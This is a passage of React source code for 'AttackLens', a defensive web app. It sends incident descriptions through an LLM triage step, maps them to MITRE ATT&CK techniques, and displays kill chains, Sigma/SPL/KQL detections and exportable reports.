              </div>
              <div className="text-xs text-amber-300/70 mt-1">
                Next attempt in {((retryInfo.countdown ?? retryInfo.delayMs) / 1000).toFixed(1)}s
              </div>
            </div>
          </div>
        </Card>
      )}

      {error && (
        <Card className="p-4 border-red-500/40 bg-red-500/5">
          <div className="flex items-start gap-3">
            <AlertTriangle size={18} className="text-red-400 flex-shrink-0 mt-0.5" />
            <div className="flex-1">
              <div className="text-sm font-medium text-red-300">Refinement failed</div>
              <div className="text-xs text-red-400/80 mt-1 font-mono whitespace-pre-wrap">{error}</div>
              <div className="mt-3"><Button variant="subtle" icon={RefreshCw} onClick={refine}>Retry</Button></div>
            </div>
          </div>
        </Card>
      )}
    </div>
  );
};

const AnalyzeView = ({ onComplete, onCancel, initialContent = "", initialMode = "nl_incident", initialTitle = "" }) => {
  const [mode, setMode] = useState(initialMode);
  const [content, setContent] = useState(initialContent);
  const [title, setTitle] = useState(initialTitle);
  const [running, setRunning] = useState(false);
  const [triaging, setTriaging] = useState(false);   // separate from full analysis
  const [stage, setStage] = useState(null);
  const [error, setError] = useState(null);
  const [retryInfo, setRetryInfo] = useState(null);
  const [followups, setFollowups] = useState(null);  // { questions, what_we_understood, answers, round }
  const abortRef = useRef(null);
  const currentMode = INPUT_MODES.find(m => m.id === mode);

  const stages = [
    { id: "parse",  label: "Parsing input & detecting format" },
    { id: "rag",    label: "Retrieving MITRE ATT&CK context" },
    { id: "map",    label: "Mapping to techniques (rule + LLM fusion)" },
    { id: "chain",  label: "Reconstructing kill chain" },
    { id: "detect", label: "Generating Sigma / SPL / KQL detections" },
    { id: "actor",  label: "Computing threat-actor overlap" },
    { id: "score",  label: "Risk scoring & finalization" },
  ];

  useEffect(() => {
    if (!retryInfo) return;
    const startedAt = Date.now();
    const id = setInterval(() => {
      const elapsed = Date.now() - startedAt;
      const remaining = Math.max(0, retryInfo.delayMs - elapsed);
      setRetryInfo(r => r ? { ...r, countdown: remaining } : r);
      if (remaining <= 0) clearInterval(id);
    }, 100);
    return () => clearInterval(id);
  }, [retryInfo?.attempt, retryInfo?.delayMs]);

  // Reset follow-ups when user changes mode or wipes content
  useEffect(() => { setFollowups(null); setError(null); }, [mode]);

  const cancel = () => {
    abortRef.current?.abort();
    abortRef.current = null;
    setTriaging(false);
    setRunning(false);
    setRetryInfo(null);
  };

  // Combines original input + Q&A pairs into a single rich description for the analyzer
  const combineInput = (base, qa) => {
    if (!qa || qa.length === 0) return base;
    const block = qa.map(x => `Q: ${x.question}\nA: ${x.answer || "(not provided)"}`).join("\n\n");
    return `${base}\n\n--- Additional details provided by the user ---\n${block}`;
  };

  // Run the full MITRE analysis with the (possibly enriched) content
  const runFullAnalysis = async (finalContent) => {
    setRunning(true);
    setStage(0);
    const controller = new AbortController();
    abortRef.current = controller;

    const stageInterval = setInterval(() => {
      setStage(s => (s == null ? 0 : Math.min(s + 1, stages.length - 2)));
    }, 800);

    try {
      const result = await runAnalysis(mode, finalContent, { title }, {
        signal: controller.signal,
        onRetry: (info) => setRetryInfo({ ...info, countdown: info.delayMs }),
      });
      clearInterval(stageInterval);
      setRetryInfo(null);
      setStage(stages.length - 1);

      const analysis = {
        id: crypto.randomUUID(),
        title: title || result.title || "Untitled analysis",
        created_at: new Date().toISOString(),
        input_type: mode,
        input_preview: finalContent.slice(0, 800),
        ...result,
      };
      await storage.saveAnalysis(analysis);
      setTimeout(() => {
        setRunning(false);
        abortRef.current = null;
        setFollowups(null);
        onComplete(analysis);
      }, 350);
    } catch (e) {
      clearInterval(stageInterval);
      setRunning(false);
      setRetryInfo(null);
      abortRef.current = null;
      if (e.message !== "Cancelled") setError(e.message || "Analysis failed");
    }
  };

  // Entry-point — for NL mode, route through triage first
  const submit = async () => {
    setError(null); setRetryInfo(null);
    if (!content.trim()) { setError("Input cannot be empty."); return; }

    // Non-NL modes: skip triage, go straight to analysis
    if (mode !== "nl_incident") {
      await runFullAnalysis(content);
      return;
    }

    // NL mode: triage first
    setTriaging(true);
    const controller = new AbortController();
    abortRef.current = controller;
    try {
      const triage = await triageNLInput(content, {
        signal: controller.signal,
        onRetry: (info) => setRetryInfo({ ...info, countdown: info.delayMs }),
      });
      setRetryInfo(null);
      setTriaging(false);
      abortRef.current = null;

      if (triage.ready || !triage.questions || triage.questions.length === 0) {
        // Got enough — run the real analysis
        await runFullAnalysis(content);
      } else {
        // Need more info — show follow-up questions
        setFollowups({
          questions: triage.questions,
          what_we_understood: triage.what_we_understood || "",
          reason: triage.reason || "",
          answers: triage.questions.map(() => ""),
          round: 1,
        });
      }
    } catch (e) {
      setTriaging(false);
      setRetryInfo(null);
      abortRef.current = null;
      if (e.message !== "Cancelled") setError(e.message || "Triage failed");
    }
  };

  // User answered the follow-ups — combine + re-triage (round 2) or just run
  const submitFollowups = async () => {
    if (!followups) return;
    const qa = followups.questions.map((q, i) => ({
      question: q.question,
      answer: followups.answers[i]?.trim() || "",
    }));
    const combined = combineInput(content, qa);

    // Round 2 max; after that just run with whatever we have
    if (followups.round >= 2) {
      setFollowups(null);
      await runFullAnalysis(combined);
      return;
    }

    // Re-triage to see if we have enough now
    setError(null); setRetryInfo(null);
    setTriaging(true);
    const controller = new AbortController();
    abortRef.current = controller;
    try {
      const triage = await triageNLInput(combined, {
        signal: controller.signal,
        onRetry: (info) => setRetryInfo({ ...info, countdown: info.delayMs }),
      });
      setRetryInfo(null);
      setTriaging(false);
      abortRef.current = null;

      if (triage.ready || !triage.questions || triage.questions.length === 0) {
        setFollowups(null);
        await runFullAnalysis(combined);
      } else {
        setFollowups({
          questions: triage.questions,
          what_we_understood: triage.what_we_understood || followups.what_we_understood,
          reason: triage.reason || "",
          answers: triage.questions.map(() => ""),
          round: followups.round + 1,
        });
      }
    } catch (e) {
      setTriaging(false);
      setRetryInfo(null);
      abortRef.current = null;
      if (e.message !== "Cancelled") setError(e.message || "Follow-up triage failed");
    }
  };

  // Bypass triage and force analysis with what we have
  const skipTriage = async () => {
    if (!followups) return;
    const qa = followups.questions.map((q, i) => ({
      question: q.question,
      answer: followups.answers[i]?.trim() || "",
    })).filter(x => x.answer);
    const combined = combineInput(content, qa);
    setFollowups(null);
    await runFullAnalysis(combined);
  };

  return (
    <div className="space-y-4 max-w-5xl">
      <div className="flex items-end justify-between">
        <div>
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest">Analyze</div>
          <h1 className="text-2xl font-semibold text-zinc-100">New Attack Analysis</h1>
          <div className="text-sm text-zinc-500 mt-1">Submit any artifact — logs, attack names, IOCs, incidents, or detection rules — and AttackLens maps it to MITRE ATT&CK in real time.</div>
        </div>
        <Button variant="ghost" onClick={onCancel}>Cancel</Button>
      </div>

      <Card className="p-4">
        <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-2">Input Mode</div>
        <div className="grid grid-cols-3 gap-2 lg:grid-cols-6">
          {INPUT_MODES.map(m => {
            const Icon = m.icon;
            const active = m.id === mode;
            return (
              <button key={m.id} onClick={() => setMode(m.id)} disabled={running || triaging || !!followups}
                className={`flex flex-col items-start gap-1.5 p-3 rounded-md border text-left transition-all ${
                  active
                    ? "border-cyan-500/40 bg-cyan-500/5"
                    : "border-zinc-800 bg-zinc-900/30 hover:border-zinc-700 hover:bg-zinc-800/40"
                } disabled:opacity-50 disabled:cursor-not-allowed`}>
                <Icon size={14} className={active ? "text-cyan-400" : "text-zinc-500"} />
                <span className={`text-xs font-medium ${active ? "text-cyan-200" : "text-zinc-300"}`}>{m.label}</span>
              </button>
            );
          })}
        </div>
        <div className="mt-2 text-xs text-zinc-500">{currentMode.hint}</div>

        {/* Quick samples — show only when content is empty and not mid-flow */}
        {!content.trim() && !running && !triaging && !followups && (
          <div className="mt-3 pt-3 border-t border-zinc-800/60">
            <div className="text-[10px] uppercase tracking-widest text-zinc-500 mb-2 flex items-center gap-2">
              <PlayCircle size={11} />
              <span>Try a sample scenario — click to load</span>
            </div>
            <div className="flex flex-wrap gap-1.5">
              {QUICK_SAMPLES.map(s => {
                const Icon = s.icon;
                return (
                  <button key={s.id}
                    onClick={() => { setMode(s.mode); setContent(s.content); setTitle(s.title); }}
                    className={`inline-flex items-center gap-1.5 text-xs px-2.5 py-1.5 rounded-md border ${s.accent} hover:brightness-125 transition-all`}>
                    <Icon size={11} />
                    {s.title}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </Card>

      <Card className="p-4">
        <div className="mb-3">
          <label className="text-[10px] text-zinc-500 uppercase tracking-widest">Analysis Title (optional)</label>
          <input
            value={title}
            onChange={e => setTitle(e.target.value)}
            disabled={running || triaging || !!followups}
            placeholder="e.g. Suspicious activity on WIN-DC01"
            className="mt-1 w-full bg-zinc-950 border border-zinc-800 rounded-md px-3 py-2 text-sm text-zinc-100 placeholder-zinc-600 focus:border-cyan-500/50 focus:outline-none disabled:opacity-70"
          />
        </div>
        <label className="text-[10px] text-zinc-500 uppercase tracking-widest">Input</label>
        <textarea
          value={content}
          onChange={e => setContent(e.target.value)}
          disabled={running || triaging || followups}
          placeholder={currentMode.placeholder}
          className="mt-1 w-full bg-zinc-950 border border-zinc-800 rounded-md px-3 py-2.5 text-sm text-zinc-100 placeholder-zinc-600 focus:border-cyan-500/50 focus:outline-none font-mono disabled:opacity-70"
          style={{ minHeight: 240, lineHeight: 1.55 }}
        />
        <div className="mt-3 flex items-center justify-between">
          <div className="text-xs text-zinc-500">
            {content.length} chars · model: claude-sonnet-4
            {mode === "nl_incident" && !followups && !running && !triaging && (
              <span className="ml-2 text-cyan-500/70">· we'll ask follow-up questions if needed</span>
            )}
          </div>
          <div className="flex items-center gap-2">
            {!running && !triaging && !followups && <Button variant="ghost" onClick={() => setContent("")} disabled={!content}>Clear</Button>}
            {(running || triaging) ? (
              <Button variant="danger" icon={X} onClick={cancel}>Cancel</Button>
            ) : !followups ? (
              <Button variant="primary" icon={Sparkles} onClick={submit} disabled={!content.trim()}>
                {mode === "nl_incident" ? "Analyze" : "Run Analysis"}
              </Button>
            ) : null}
          </div>
        </div>
      </Card>

      {triaging && !retryInfo && (
        <Card className="p-4 border-cyan-500/30 bg-cyan-500/5">
          <div className="flex items-center gap-3">
            <Spinner size={18} />
            <div>
              <div className="text-sm font-medium text-cyan-200">Reading your description…</div>
              <div className="text-xs text-cyan-300/60 mt-0.5">Checking if we have enough detail to map this to MITRE ATT&CK techniques.</div>
            </div>
          </div>
        </Card>
      )}

      {followups && !running && !triaging && (
        <Card className="p-5 border-cyan-500/30 bg-cyan-500/5">
          <div className="flex items-start gap-3 mb-4">
            <div className="w-9 h-9 rounded-full bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center flex-shrink-0">
              <MessageSquare size={16} className="text-cyan-300" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="text-sm font-semibold text-cyan-100">
                I need a bit more detail
                {followups.round > 1 && (
                  <span className="ml-2 text-[10px] uppercase tracking-widest text-cyan-400/60">round {followups.round}</span>
                )}
              </div>
              {followups.what_we_understood && (
                <div className="mt-1 text-xs text-cyan-300/80">
                  <span className="font-medium">What I understood so far:</span> {followups.what_we_understood}
                </div>
              )}
              {followups.reason && (
                <div className="mt-1 text-xs text-cyan-300/60 italic">{followups.reason}</div>
              )}
              <div className="mt-2 text-[11px] text-cyan-400/60">
                Answer what you can — leave blank if you don't know. You can skip ahead to analyze with just what you've shared.
              </div>
            </div>
          </div>

          <div className="space-y-4">
            {followups.questions.map((q, i) => (
              <div key={i} className="border border-zinc-800 rounded-md bg-zinc-900/40 p-3">
                <div className="flex items-start gap-2">
                  <span className="text-cyan-400 font-mono text-xs mt-0.5 flex-shrink-0">{i + 1}.</span>
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-zinc-100 font-medium">{q.question}</div>
                    {q.why_we_ask && (
                      <div className="text-[11px] text-zinc-500 mt-0.5 italic">{q.why_we_ask}</div>
                    )}
                    {q.examples?.length > 0 && (
                      <div className="mt-2 flex flex-wrap gap-1.5">
                        {q.examples.map((ex, j) => (
                          <button key={j}
                            onClick={() => {
                              const next = [...followups.answers];
                              next[i] = next[i] ? `${next[i]}, ${ex}` : ex;
                              setFollowups({ ...followups, answers: next });
                            }}
                            className="text-[11px] px-2 py-1 rounded bg-zinc-800/60 border border-zinc-700 text-zinc-300 hover:bg-cyan-500/10 hover:border-cyan-500/40 hover:text-cyan-200 transition-colors text-left"
                            type="button"
                          >
                            + {ex}
                          </button>
                        ))}
                      </div>
                    )}
                    <textarea
                      value={followups.answers[i]}
                      onChange={e => {
                        const next = [...followups.answers];
                        next[i] = e.target.value;
                        setFollowups({ ...followups, answers: next });
                      }}
                      placeholder="Your answer (or leave blank)…"
                      className="mt-2 w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-sm text-zinc-100 placeholder-zinc-600 focus:border-cyan-500/50 focus:outline-none resize-y"
                      rows={2}
                    />
                  </div>
                </div>
              </div>
            ))}
          </div>

          <div className="mt-4 flex items-center justify-between">
            <button
              onClick={() => { setFollowups(null); setError(null); }}
              className="text-xs text-zinc-500 hover:text-zinc-300"
            >
              ← Back to editing original description
            </button>
            <div className="flex items-center gap-2">
              <Button variant="ghost" onClick={skipTriage}>
                Skip & analyze with current info
              </Button>
              <Button variant="primary" icon={Sparkles} onClick={submitFollowups}
                disabled={followups.answers.every(a => !a.trim())}>
                Continue
              </Button>
            </div>
          </div>
        </Card>
      )}

      {retryInfo && (
        <Card className="p-4 border-amber-500/40 bg-amber-500/5">
          <div className="flex items-start gap-3">
            <RefreshCw size={18} className="text-amber-400 flex-shrink-0 mt-0.5 animate-spin" />
            <div className="flex-1 min-w-0">
              <div className="text-sm font-medium text-amber-200">
                Anthropic API is busy — retrying ({retryInfo.attempt}/{retryInfo.maxRetries})
              </div>
              <div className="text-xs text-amber-300/70 mt-1">
                Next attempt in {((retryInfo.countdown ?? retryInfo.delayMs) / 1000).toFixed(1)}s · exponential backoff with jitter
              </div>
              {retryInfo.reason && (
                <div className="text-[11px] text-amber-300/60 mt-1 font-mono truncate">
                  {retryInfo.reason}
                </div>
              )}
              <div className="mt-2 h-1 rounded-full bg-amber-900/40 overflow-hidden">
                <div
                  className="h-full bg-amber-400 transition-all"
                  style={{ width: `${100 - ((retryInfo.countdown ?? retryInfo.delayMs) / retryInfo.delayMs) * 100}%` }}
                />
              </div>
            </div>
          </div>
        </Card>
      )}

      {running && (
        <Card className="p-4">
          <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-3">Analysis Pipeline</div>
          <div className="space-y-2">
            {stages.map((s, i) => {
              const done = stage != null && i < stage;
              const active = stage === i;
              return (
                <div key={s.id} className="flex items-center gap-3">
                  <div className={`w-5 h-5 rounded-full flex items-center justify-center border ${
                    done ? "bg-emerald-500/20 border-emerald-500/50" :
                    active ? "bg-cyan-500/20 border-cyan-500/50" :
                    "bg-zinc-800 border-zinc-700"
                  }`}>
                    {done && <Check size={12} className="text-emerald-400" />}
                    {active && <Spinner size={12} />}
                  </div>
                  <div className={`text-sm ${done ? "text-zinc-300" : active ? "text-cyan-200" : "text-zinc-600"}`}>
                    {s.label}
                  </div>
                </div>
              );
            })}
          </div>
        </Card>
      )}

      {error && (
        <Card className="p-4 border-red-500/40 bg-red-500/5">
          <div className="flex items-start gap-3">
            <AlertTriangle size={18} className="text-red-400 flex-shrink-0 mt-0.5" />
            <div className="flex-1">
              <div className="text-sm font-medium text-red-300">
                {error.includes("overloaded") || error.includes("Overloaded") || error.includes("529")
                  ? "Anthropic API is overloaded"
                  : "Analysis failed"}
              </div>
              <div className="text-xs text-red-400/80 mt-1 font-mono whitespace-pre-wrap">{error}</div>
              <div className="mt-3 flex items-center gap-2">
                <Button variant="subtle" icon={RefreshCw} onClick={submit}>Retry now</Button>
                <span className="text-[11px] text-red-400/60">
                  Tip: 529 errors are server-side capacity. Waiting 30–60s usually resolves them.
                </span>
              </div>
            </div>
          </div>
        </Card>
      )}
    </div>
  );
};

/* ----------------------------------------------------------------- */
/*  Analysis detail (results page)                                     */
/* ----------------------------------------------------------------- */
const DETAIL_TABS = [
  { id: "overview",   label: "Overview",   icon: Eye },
  { id: "mappings",   label: "Mappings",   icon: Target },
  { id: "chain",      label: "Kill Chain", icon: GitBranch },
  { id: "detections", label: "Detections", icon: Code2 },
  { id: "iocs",       label: "IOCs",       icon: Hash },
  { id: "actors",     label: "Threat Actors", icon: Skull },
];

const CopyBtn = ({ text }) => {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard?.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1200); }}
      className="inline-flex items-center gap-1.5 px-2 py-1 rounded text-xs text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800 transition-colors"
    >
      {copied ? <Check size={12} /> : <Copy size={12} />}
      {copied ? "Copied" : "Copy"}
    </button>
  );
};

const MappingCard = ({ m, feedback, onFeedback }) => {
  const [expanded, setExpanded] = useState(false);
  const fb = feedback[m.technique_id];
  return (
    <div className="border border-zinc-800 rounded-md bg-zinc-900/30 overflow-hidden">
      <button onClick={() => setExpanded(!expanded)} className="w-full p-3 flex items-start gap-3 hover:bg-zinc-800/30 transition-colors text-left">
        <div className={`w-2 h-2 rounded-full mt-2 ${sevDot(m.severity)}`} />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="font-mono text-sm text-cyan-400">{m.technique_id}</span>
            <span className="text-sm text-zinc-200 font-medium">{m.technique_name}</span>
            <Pill className="border-zinc-700 text-zinc-400 bg-zinc-800/40">{m.tactic_name || TACTIC_BY_ID[m.tactic_id]?.name}</Pill>
            {m.source_engine && <Pill className="border-violet-500/30 text-violet-300 bg-violet-500/10">{m.source_engine}</Pill>}
          </div>
          {!expanded && m.evidence?.[0] && (
            <div className="mt-1 text-xs text-zinc-500 truncate font-mono">"{m.evidence[0]}"</div>
          )}
        </div>
        <div className="flex items-center gap-3">
          <div className="text-right">
            <div className={`text-sm font-mono tabular-nums ${sevColor(m.severity)}`}>{m.severity}</div>
            <div className="text-[10px] text-zinc-500 uppercase tracking-wider">sev</div>
          </div>
          <div className="text-right">
            <div className="text-sm font-mono tabular-nums text-zinc-300">{(m.confidence * 100).toFixed(0)}%</div>
            <div className="text-[10px] text-zinc-500 uppercase tracking-wider">conf</div>
          </div>
          {expanded ? <ChevronUp size={14} className="text-zinc-500" /> : <ChevronDown size={14} className="text-zinc-500" />}
        </div>
      </button>

      {expanded && (
        <div className="px-3 pb-3 border-t border-zinc-800/60 pt-3 space-y-3">
          {m.reasoning && (
            <div>
              <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-1">Reasoning</div>
              <div className="text-xs text-zinc-300 leading-relaxed">{m.reasoning}</div>
            </div>
          )}
          {m.evidence?.length > 0 && (
            <div>
              <div className="text-[10px] text-zinc-500 uppercase tracking-widest mb-1">Evidence</div>
              <div className="space-y-1">
                {m.evidence.map((e, i) => (
                  <div key={i} className="text-xs text-zinc-300 font-mono bg-zinc-950/60 border border-zinc-800/60 rounded px-2 py-1.5">
                    "{e}"
                  </div>
                ))}
              </div>
            </div>
          )}
          <div className="flex items-center justify-between pt-1">
            <a
              href={`https://attack.mitre.org/techniques/${m.technique_id.replace(".", "/")}/`}
              target="_blank" rel="noopener noreferrer"
              className="inline-flex items-center gap-1.5 text-xs text-cyan-400 hover:text-cyan-300"
            >
              View on MITRE <ExternalLink size={11} />
            </a>
            <div className="flex items-center gap-1">
              <span className="text-[10px] text-zinc-500 uppercase tracking-widest mr-1">Analyst feedback</span>
              <button
                onClick={() => onFeedback(m.technique_id, fb === "up" ? null : "up")}
                className={`p-1.5 rounded ${fb === "up" ? "text-emerald-400 bg-emerald-500/10" : "text-zinc-500 hover:text-emerald-400 hover:bg-zinc-800"}`}
                title="Correct mapping"
              ><ThumbsUp size={13} /></button>
              <button
                onClick={() => onFeedback(m.technique_id, fb === "down" ? null : "down")}
                className={`p-1.5 rounded ${fb === "down" ? "text-red-400 bg-red-500/10" : "text-zinc-500 hover:text-red-400 hover:bg-zinc-800"}`}
                title="Incorrect mapping"
              ><ThumbsDown size={13} /></button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const KillChainStep = ({ step, isLast }) => {
  const tech = TECH_BY_ID[step.technique_id];
  const tactic = tech ? TACTIC_BY_ID[tech.tactic] : null;
  const hasMeta = step.timestamp || step.host || step.actor;
  return (
    <div className="flex gap-3">
      <div className="flex flex-col items-center">
        <div className="w-7 h-7 rounded-full bg-cyan-500/20 border border-cyan-500/50 text-cyan-300 text-xs font-mono flex items-center justify-center flex-shrink-0">
          {step.order}
        </div>
        {!isLast && <div className="flex-1 w-px bg-gradient-to-b from-cyan-500/40 to-zinc-800 min-h-[40px] my-1" />}
      </div>
      <div className="flex-1 pb-4 min-w-0">
        <div className="flex items-center gap-2 flex-wrap">
          <span className="font-mono text-sm text-cyan-400">{step.technique_id}</span>
          {tech && <span className="text-sm text-zinc-200">{tech.name}</span>}
          {tactic && <Pill className="border-zinc-700 text-zinc-400 bg-zinc-800/40">{tactic.name}</Pill>}
        </div>
        {hasMeta && (
          <div className="mt-1 flex items-center gap-3 flex-wrap text-[11px] text-zinc-500">
            {step.timestamp && (
              <span className="inline-flex items-center gap-1 font-mono">
                <Clock size={10} />{step.timestamp}
              </span>
            )}
            {step.host && (
              <span className="inline-flex items-center gap-1 font-mono">
                <Database size={10} />{step.host}
              </span>
            )}
            {step.actor && (
              <span className="inline-flex items-center gap-1 font-mono">
                <Target size={10} />{step.actor}
              </span>
            )}
          </div>
        )}
        <div className="mt-1 text-xs text-zinc-300 leading-relaxed">{step.description}</div>
      </div>
    </div>
  );
};

const DetectionPanel = ({ d }) => {
  const [tab, setTab] = useState("sigma");
  const tabs = [
    { id: "sigma",   label: "Sigma",   content: d.content },
    { id: "splunk",  label: "Splunk SPL", content: d.splunk_spl },
    { id: "kql",     label: "KQL",     content: d.kql },
  ].filter(t => t.content);

  return (
    <div className="border border-zinc-800 rounded-md overflow-hidden">
      <div className="p-3 border-b border-zinc-800 bg-zinc-900/40">
        <div className="flex items-start justify-between gap-3">
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="font-mono text-sm text-cyan-400">{d.technique_id}</span>
              <span className="text-sm text-zinc-100 font-medium truncate">{d.title}</span>
            </div>
            {d.description && <div className="text-xs text-zinc-500 mt-1">{d.description}</div>}
            {d.log_source && (
              <div className="mt-1.5 flex items-center gap-2 text-[10px] uppercase tracking-widest text-zinc-500">
                {d.log_source.product && <span>product: <span className="text-zinc-400">{d.log_source.product}</span></span>}
                {d.log_source.service && <span>service: <span className="text-zinc-400">{d.log_source.service}</span></span>}
                {d.log_source.category && <span>category: <span className="text-zinc-400">{d.log_source.category}</span></span>}
              </div>
            )}
          </div>
        </div>
      </div>
      <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800 bg-zinc-950/40">
        <div className="flex items-center gap-1">
          {tabs.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`text-xs px-2.5 py-1 rounded-md transition-colors ${
                tab === t.id ? "bg-zinc-800 text-cyan-300" : "text-zinc-500 hover:text-zinc-300"
              }`}>{t.label}</button>
          ))}
        </div>
        {tabs.find(t => t.id === tab)?.content && <CopyBtn text={tabs.find(t => t.id === tab).content} />}
      </div>
      <pre className="p-3 text-xs text-zinc-300 overflow-x-auto bg-zinc-950/40 font-mono leading-relaxed max-h-96">
        <code>{tabs.find(t => t.id === tab)?.content || "// No content for this format"}</code>
      </pre>
    </div>
  );
};

const AnalysisDetail = ({ analysis: initialAnalysis, onBack, onDelete, onNewAnalysis, refresh }) => {
  const [analysis, setAnalysis] = useState(initialAnalysis);
  const [tab, setTab] = useState("overview");
  const [feedback, setFeedback] = useState({});
  const [tagInput, setTagInput] = useState("");
  const [notesDraft, setNotesDraft] = useState(analysis.notes || "");
  const [notesSaved, setNotesSaved] = useState(false);
  const [statusOpen, setStatusOpen] = useState(false);

  useEffect(() => {
    setAnalysis(initialAnalysis);
    setNotesDraft(initialAnalysis.notes || "");
  }, [initialAnalysis.id]);

  useEffect(() => {
    storage.getFeedback(analysis.id).then(setFeedback);
  }, [analysis.id]);

  const onFeedback = async (techId, val) => {
    const next = { ...feedback };
    if (val == null) delete next[techId]; else next[techId] = val;
    setFeedback(next);
    await storage.saveFeedback(analysis.id, next);
  };

  // Persist tag/note/status changes
  const updateMeta = async (patch) => {
    const updated = await storage.updateAnalysisMeta(analysis.id, patch);
    if (updated) { setAnalysis(updated); refresh(); }
  };

  const addTag = async () => {
    const t = tagInput.trim().toLowerCase();
    if (!t) return;
    const existing = analysis.tags || [];
    if (existing.includes(t)) { setTagInput(""); return; }
    await updateMeta({ tags: [...existing, t].slice(0, 12) });
    setTagInput("");
  };
  const removeTag = async (t) => {
    await updateMeta({ tags: (analysis.tags || []).filter(x => x !== t) });
  };
  const saveNotes = async () => {
    await updateMeta({ notes: notesDraft });
    setNotesSaved(true);
    setTimeout(() => setNotesSaved(false), 1500);
  };
  const setStatus = async (s) => {
    setStatusOpen(false);
    await updateMeta({ status: s });
  };

  const exportJSON = () => {
    const blob = new Blob([JSON.stringify(analysis, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url; a.download = `attacklens-${analysis.id.slice(0, 8)}.json`;
    a.click(); URL.revokeObjectURL(url);
  };

  const exportNavigator = () => {
    const layer = {
      name: analysis.title || "AttackLens Layer",
      versions: { attack: "14", navigator: "4.9.1", layer: "4.5" },
      domain: "enterprise-attack",
      description: analysis.summary || "",
      techniques: (analysis.mappings || []).map(m => ({
        techniqueID: m.technique_id,
        score: m.severity || 50,
        comment: m.reasoning || "",
        enabled: true,
      })),
      gradient: { colors: ["#34d399", "#fbbf24", "#fb923c", "#f87171", "#e879f9"], minValue: 0, maxValue: 100 },
    };
    const blob = new Blob([JSON.stringify(layer, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url; a.download = `attacklens-navigator-${analysis.id.slice(0, 8)}.json`;
    a.click(); URL.revokeObjectURL(url);
  };

  // Generate a polished printable HTML report and open it in a new tab
  const exportReport = () => {
    const esc = (s) => String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
    const mappingsHTML = (analysis.mappings || []).map(m => `
      <tr>
        <td class="mono">${esc(m.technique_id)}</td>
        <td>${esc(m.technique_name || "")}</td>
        <td>${esc(m.tactic_name || "")}</td>
        <td class="num">${esc(m.severity)}</td>
        <td class="num">${Math.round((m.confidence || 0) * 100)}%</td>
        <td class="small">${esc(m.reasoning || "")}</td>
      </tr>`).join("");
    const chainHTML = (analysis.chain || []).map(s => `
      <li>
        <div class="chain-step">
          <span class="chain-num">${s.order}</span>
          <div>
            <div><strong class="mono">${esc(s.technique_id)}</strong>${s.timestamp ? ` <span class="meta">· ${esc(s.timestamp)}</span>` : ""}${s.host ? ` <span class="meta">· ${esc(s.host)}</span>` : ""}</div>
            <div class="small">${esc(s.description)}</div>
          </div>
        </div>
      </li>`).join("");
    const iocsHTML = (analysis.iocs || []).map(i => `
      <tr><td class="mono small">${esc(i.type)}</td><td class="mono">${esc(i.value)}</td><td class="small">${esc(i.context || "")}</td></tr>`).join("");
    const recHTML = (analysis.recommendations || []).map(r => `<li>${esc(r)}</li>`).join("");
    const actorsHTML = (analysis.threat_actors || []).map(a => `<li><strong>${esc(a.name)}</strong> — ${Math.round(a.similarity * 100)}% overlap. <span class="small">${esc(a.reasoning || "")}</span></li>`).join("");
    const tagsHTML = (analysis.tags || []).map(t => `<span class="tag">${esc(t)}</span>`).join("");

    const html = `<!doctype html><html><head><meta charset="utf-8"><title>${esc(analysis.title)} — AttackLens Report</title>
<style>
  @page { margin: 0.6in; }
  * { box-sizing: border-box; }
  body { font: 11pt/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, sans-serif; color: #111827; max-width: 7.5in; margin: 0 auto; padding: 0.4in 0.2in; }
  h1 { font-size: 22pt; margin: 0 0 4pt 0; letter-spacing: -0.01em; }
  h2 { font-size: 13pt; margin: 22pt 0 6pt 0; padding-bottom: 4pt; border-bottom: 1px solid #d1d5db; letter-spacing: -0.005em; }
  h3 { font-size: 11pt; margin: 14pt 0 4pt 0; color: #374151; }
  p { margin: 0 0 8pt 0; }
  .meta-row { color: #6b7280; font-size: 9.5pt; margin-bottom: 14pt; }
  .badges { display: flex; gap: 8pt; flex-wrap: wrap; margin: 10pt 0 18pt; }
  .badge { display: inline-block; padding: 3pt 8pt; border-radius: 3pt; font-size: 8.5pt; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; }
  .sev-critical { background: #fce7f3; color: #9d174d; }
  .sev-high { background: #fee2e2; color: #991b1b; }
  .sev-medium { background: #fed7aa; color: #9a3412; }
  .sev-low { background: #fef3c7; color: #92400e; }
  .sev-info { background: #d1fae5; color: #065f46; }
  .kpi-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10pt; margin-bottom: 18pt; }
  .kpi { background: #f9fafb; border: 1px solid #e5e7eb; padding: 8pt 10pt; border-radius: 4pt; }
  .kpi-label { font-size: 8pt; text-transform: uppercase; letter-spacing: 0.08em; color: #6b7280; font-weight: 600; }
  .kpi-value { font-size: 18pt; font-weight: 700; margin-top: 2pt; font-variant-numeric: tabular-nums; }
  table { width: 100%; border-collapse: collapse; margin-top: 6pt; font-size: 9.5pt; }
  th, td { text-align: left; padding: 5pt 7pt; border-bottom: 1px solid #e5e7eb; vertical-align: top; }
  th { background: #f3f4f6; font-size: 8.5pt; text-transform: uppercase; letter-spacing: 0.05em; color: #374151; }
